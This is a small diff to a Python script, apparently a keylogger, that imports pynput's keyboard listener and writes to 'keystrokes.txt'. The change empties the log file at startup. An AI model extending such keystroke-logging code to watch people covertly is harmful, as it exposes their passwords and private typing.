@@ -2,6 +2,10 @@ from pynput import keyboard
 import threading
 
 log_file = 'keystrokes.txt'
+
+with open(log_file, 'w') as file:
+    pass
+
 file=open(log_file, 'a')
 
 stop_event = threading.Event()
